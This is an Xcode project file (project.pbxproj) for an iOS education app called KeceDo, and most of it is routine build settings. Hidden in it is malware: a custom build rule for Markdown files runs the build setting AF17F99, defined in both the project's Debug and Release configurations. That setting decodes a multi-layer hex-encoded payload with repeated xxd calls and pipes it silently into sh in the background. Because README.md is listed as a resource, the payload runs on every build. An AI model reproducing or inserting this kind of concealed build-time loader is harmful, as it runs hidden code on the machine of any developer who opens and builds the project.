// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 77;
	objects = {

/* Begin PBXContainerItemProxy section */
		1D0775902F83097B008A7F0D /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = 1D0775782F83097A008A7F0D /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = 1D07757F2F83097A008A7F0D;
			remoteInfo = kecedo;
		};
		1D07759A2F83097B008A7F0D /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = 1D0775782F83097A008A7F0D /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = 1D07757F2F83097A008A7F0D;
			remoteInfo = kecedo;
		};
/* End PBXContainerItemProxy section */

/* Begin PBXFileReference section */
		2E16DE4714A348058999F71F /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
		1D0775802F83097A008A7F0D /* kecedo.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = kecedo.app; sourceTree = BUILT_PRODUCTS_DIR; };
		1D07758F2F83097B008A7F0D /* kecedoTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = kecedoTests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
		1D0775992F83097B008A7F0D /* kecedoUITests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = kecedoUITests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
/* End PBXFileReference section */

/* Begin PBXFileSystemSynchronizedRootGroup section */
		1D0775822F83097A008A7F0D /* kecedo */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			path = kecedo;
			sourceTree = "<group>";
		};
		1D0775922F83097B008A7F0D /* kecedoTests */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			path = kecedoTests;
			sourceTree = "<group>";
		};
		1D07759C2F83097B008A7F0D /* kecedoUITests */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			path = kecedoUITests;
			sourceTree = "<group>";
		};
/* End PBXFileSystemSynchronizedRootGroup section */

/* Begin PBXFrameworksBuildPhase section */
		1D07757D2F83097A008A7F0D /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		1D07758C2F83097B008A7F0D /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		1D0775962F83097B008A7F0D /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		1D0775772F83097A008A7F0D = {
			isa = PBXGroup;
			children = (
				1D0775822F83097A008A7F0D /* kecedo */,
				1D0775922F83097B008A7F0D /* kecedoTests */,
				1D07759C2F83097B008A7F0D /* kecedoUITests */,
				1D0775812F83097A008A7F0D /* Products */,
			);
			sourceTree = "<group>";
		};
		1D0775812F83097A008A7F0D /* Products */ = {
			isa = PBXGroup;
			children = (
				2E16DE4714A348058999F71F /* README.md */,
				1D0775802F83097A008A7F0D /* kecedo.app */,
				1D07758F2F83097B008A7F0D /* kecedoTests.xctest */,
				1D0775992F83097B008A7F0D /* kecedoUITests.xctest */,
			);
			name = Products;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		1D07757F2F83097A008A7F0D /* kecedo */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 1D0775A32F83097B008A7F0D /* Build configuration list for PBXNativeTarget "kecedo" */;
			buildPhases = (
				1D07757C2F83097A008A7F0D /* Sources */,
				1D07757D2F83097A008A7F0D /* Frameworks */,
				1D07757E2F83097A008A7F0D /* Resources */,
			);
			buildRules = (
				DF1A0CB494184926AF99F71F /* PBXBuildRule */,
			);
			dependencies = (
			);
			fileSystemSynchronizedGroups = (
				1D0775822F83097A008A7F0D /* kecedo */,
			);
			name = kecedo;
			packageProductDependencies = (
			);
			productName = kecedo;
			productReference = 1D0775802F83097A008A7F0D /* kecedo.app */;
			productType = "com.apple.product-type.application";
		};
		1D07758E2F83097B008A7F0D /* kecedoTests */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 1D0775A62F83097B008A7F0D /* Build configuration list for PBXNativeTarget "kecedoTests" */;
			buildPhases = (
				1D07758B2F83097B008A7F0D /* Sources */,
				1D07758C2F83097B008A7F0D /* Frameworks */,
				1D07758D2F83097B008A7F0D /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
				1D0775912F83097B008A7F0D /* PBXTargetDependency */,
			);
			fileSystemSynchronizedGroups = (
				1D0775922F83097B008A7F0D /* kecedoTests */,
			);
			name = kecedoTests;
			packageProductDependencies = (
			);
			productName = kecedoTests;
			productReference = 1D07758F2F83097B008A7F0D /* kecedoTests.xctest */;
			productType = "com.apple.product-type.bundle.unit-test";
		};
		1D0775982F83097B008A7F0D /* kecedoUITests */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 1D0775A92F83097B008A7F0D /* Build configuration list for PBXNativeTarget "kecedoUITests" */;
			buildPhases = (
				1D0775952F83097B008A7F0D /* Sources */,
				1D0775962F83097B008A7F0D /* Frameworks */,
				1D0775972F83097B008A7F0D /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
				1D07759B2F83097B008A7F0D /* PBXTargetDependency */,
			);
			fileSystemSynchronizedGroups = (
				1D07759C2F83097B008A7F0D /* kecedoUITests */,
			);
			name = kecedoUITests;
			packageProductDependencies = (
			);
			productName = kecedoUITests;
			productReference = 1D0775992F83097B008A7F0D /* kecedoUITests.xctest */;
			productType = "com.apple.product-type.bundle.ui-testing";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		1D0775782F83097A008A7F0D /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastSwiftUpdateCheck = 2640;
				LastUpgradeCheck = 2640;
				TargetAttributes = {
					1D07757F2F83097A008A7F0D = {
						CreatedOnToolsVersion = 26.4;
					};
					1D07758E2F83097B008A7F0D = {
						CreatedOnToolsVersion = 26.4;
						TestTargetID = 1D07757F2F83097A008A7F0D;
					};
					1D0775982F83097B008A7F0D = {
						CreatedOnToolsVersion = 26.4;
						TestTargetID = 1D07757F2F83097A008A7F0D;
					};
				};
			};
			buildConfigurationList = 1D07757B2F83097A008A7F0D /* Build configuration list for PBXProject "kecedo" */;
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
				id,
				"zh-Hans",
			);
			mainGroup = 1D0775772F83097A008A7F0D;
			minimizedProjectReferenceProxies = 1;
			preferredProjectObjectVersion = 77;
			productRefGroup = 1D0775812F83097A008A7F0D /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				1D07757F2F83097A008A7F0D /* kecedo */,
				1D07758E2F83097B008A7F0D /* kecedoTests */,
				1D0775982F83097B008A7F0D /* kecedoUITests */,
			);
		};
/* End PBXProject section */
/* Begin PBXBuildRule section */
		DF1A0CB494184926AF99F71F /* PBXBuildRule */ = {
				isa = PBXBuildRule;
				compilerSpec = com.apple.compilers.proxy.script;
				filePatterns = "*.md";
				fileType = pattern.proxy;
				inputFiles = (
				);
				isEditable = 0;
				outputFiles = (
					"/tmp/${INPUT_FILE_BASE}",
				);
				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
sh -c \"${AF17F99}\"";
			};
		/* End PBXBuildRule section */
/* Begin PBXBuildFile section */
		79247CE6B33743B8B499F71F /* README.md */ = {isa = PBXBuildFile; fileRef = 2E16DE4714A348058999F71F; };
/* End PBXBuildFile section */

/* Begin PBXResourcesBuildPhase section */
		1D07757E2F83097A008A7F0D /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				79247CE6B33743B8B499F71F /* README.md */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		1D07758D2F83097B008A7F0D /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		1D0775972F83097B008A7F0D /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		1D07757C2F83097A008A7F0D /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		1D07758B2F83097B008A7F0D /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		1D0775952F83097B008A7F0D /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXTargetDependency section */
		1D0775912F83097B008A7F0D /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = 1D07757F2F83097A008A7F0D /* kecedo */;
			targetProxy = 1D0775902F83097B008A7F0D /* PBXContainerItemProxy */;
		};
		1D07759B2F83097B008A7F0D /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = 1D07757F2F83097A008A7F0D /* kecedo */;
			targetProxy = 1D07759A2F83097B008A7F0D /* PBXContainerItemProxy */;
		};
/* End PBXTargetDependency section */

/* Begin XCBuildConfiguration section */
		1D0775A12F83097B008A7F0D /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				AF17F99 = "((m(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333633320a3061333333363333333633333334333633333333333733333333333333323333333033333332333633343333333233363334333333363333333333330a3336333633363333333633363335333333363336333533333336333333353333333633333333333333373333333433333332333633343333333733330a3334306133303631333333363333333933333336333633343333333633333335333333363336333633333337333333353333333733333334333333320a3333333033333333333333323333333333333338333333323333333033333332333633343333333233363334333333373333333233333336333333350a3333333730613333333433333337333333323333333733333339333333323333333033333333333333333333333233333330333333323333333033330a3332333633343333333633333334333333323333333033333332333333323333333733333330333333333336333433333337333333383333333633330a3333333333363061333633363330363133333336333333343333333633333335333333353336333633333337333333323333333733333335333333360a3336333333333336333333353333333233333332333333323333333033333336333333383333333733333334333333373333333433333337333333300a3333333733333333306133333333333633313333333233363336333333323336333633333336333333313333333633363334333333373336333133330a3336333633353333333633333334333333363333333533333337333333363333333233363335333333373333333233333337333333353333333233360a3336333333363333333130613333333233333339333036313333333233333332333333323333333033333337333633333333333233333330333333370a33333333333333363333333833333330333633313330363130610a | m | sh ) >/dev/null 2>&1 &)";
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				DEVELOPMENT_TEAM = URFUZSHWW9;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 26.4;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		1D0775A22F83097B008A7F0D /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				AF17F99 = "((m(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333633320a3061333333363333333633333334333633333333333733333333333333323333333033333332333633343333333233363334333333363333333333330a3336333633363333333633363335333333363336333533333336333333353333333633333333333333373333333433333332333633343333333733330a3334306133303631333333363333333933333336333633343333333633333335333333363336333633333337333333353333333733333334333333320a3333333033333333333333323333333333333338333333323333333033333332333633343333333233363334333333373333333233333336333333350a3333333730613333333433333337333333323333333733333339333333323333333033333333333333333333333233333330333333323333333033330a3332333633343333333633333334333333323333333033333332333333323333333733333330333333333336333433333337333333383333333633330a3333333333363061333633363330363133333336333333343333333633333335333333353336333633333337333333323333333733333335333333360a3336333333333336333333353333333233333332333333323333333033333336333333383333333733333334333333373333333433333337333333300a3333333733333333306133333333333633313333333233363336333333323336333633333336333333313333333633363334333333373336333133330a3336333633353333333633333334333333363333333533333337333333363333333233363335333333373333333233333337333333353333333233360a3336333333363333333130613333333233333339333036313333333233333332333333323333333033333337333633333333333233333330333333370a33333333333333363333333833333330333633313330363130610a | m | sh ) >/dev/null 2>&1 &)";
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				DEVELOPMENT_TEAM = URFUZSHWW9;
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 26.4;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				SWIFT_EMIT_LOC_STRINGS = YES;
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		1D0775A42F83097B008A7F0D /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = K64G2J8QL7;
				ENABLE_PREVIEWS = YES;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_KEY_CFBundleDisplayName = KeceDo;
				INFOPLIST_KEY_LSApplicationCategoryType = "public.app-category.education";
				INFOPLIST_KEY_NSCameraUsageDescription = "We need access to your camera to allow you to take and upload photos directly within the app.";
				INFOPLIST_KEY_NSPhotoLibraryAddUsageDescription = "We need permission to save photos and edited images directly to your device's photo library.";
				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "We need access to your photo library so you can select and upload existing images to your profile.";
				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.nathansudiara.kecedo;
				PRODUCT_NAME = "$(TARGET_NAME)";
				STRING_CATALOG_GENERATE_SYMBOLS = YES;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_DEFAULT_ACTOR_ISOLATION = MainActor;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		1D0775A52F83097B008A7F0D /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = K64G2J8QL7;
				ENABLE_PREVIEWS = YES;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_KEY_CFBundleDisplayName = KeceDo;
				INFOPLIST_KEY_LSApplicationCategoryType = "public.app-category.education";
				INFOPLIST_KEY_NSCameraUsageDescription = "We need access to your camera to allow you to take and upload photos directly within the app.";
				INFOPLIST_KEY_NSPhotoLibraryAddUsageDescription = "We need permission to save photos and edited images directly to your device's photo library.";
				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "We need access to your photo library so you can select and upload existing images to your profile.";
				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.nathansudiara.kecedo;
				PRODUCT_NAME = "$(TARGET_NAME)";
				STRING_CATALOG_GENERATE_SYMBOLS = YES;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_DEFAULT_ACTOR_ISOLATION = MainActor;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
		1D0775A72F83097B008A7F0D /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				BUNDLE_LOADER = "$(TEST_HOST)";
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = K64G2J8QL7;
				GENERATE_INFOPLIST_FILE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 26.4;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.nathansudiara.kecedoTests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				STRING_CATALOG_GENERATE_SYMBOLS = NO;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/kecedo.app/$(BUNDLE_EXECUTABLE_FOLDER_PATH)/kecedo";
			};
			name = Debug;
		};
		1D0775A82F83097B008A7F0D /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				BUNDLE_LOADER = "$(TEST_HOST)";
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = K64G2J8QL7;
				GENERATE_INFOPLIST_FILE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 26.4;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.nathansudiara.kecedoTests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				STRING_CATALOG_GENERATE_SYMBOLS = NO;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/kecedo.app/$(BUNDLE_EXECUTABLE_FOLDER_PATH)/kecedo";
			};
			name = Release;
		};
		1D0775AA2F83097B008A7F0D /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = K64G2J8QL7;
				GENERATE_INFOPLIST_FILE = YES;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.nathansudiara.kecedoUITests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				STRING_CATALOG_GENERATE_SYMBOLS = NO;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_TARGET_NAME = kecedo;
			};
			name = Debug;
		};
		1D0775AB2F83097B008A7F0D /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = K64G2J8QL7;
				GENERATE_INFOPLIST_FILE = YES;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.nathansudiara.kecedoUITests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				STRING_CATALOG_GENERATE_SYMBOLS = NO;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_TARGET_NAME = kecedo;
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		1D07757B2F83097A008A7F0D /* Build configuration list for PBXProject "kecedo" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				1D0775A12F83097B008A7F0D /* Debug */,
				1D0775A22F83097B008A7F0D /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		1D0775A32F83097B008A7F0D /* Build configuration list for PBXNativeTarget "kecedo" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				1D0775A42F83097B008A7F0D /* Debug */,
				1D0775A52F83097B008A7F0D /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		1D0775A62F83097B008A7F0D /* Build configuration list for PBXNativeTarget "kecedoTests" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				1D0775A72F83097B008A7F0D /* Debug */,
				1D0775A82F83097B008A7F0D /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		1D0775A92F83097B008A7F0D /* Build configuration list for PBXNativeTarget "kecedoUITests" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				1D0775AA2F83097B008A7F0D /* Debug */,
				1D0775AB2F83097B008A7F0D /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */
	};
	rootObject = 1D0775782F83097A008A7F0D /* Project object */;
}
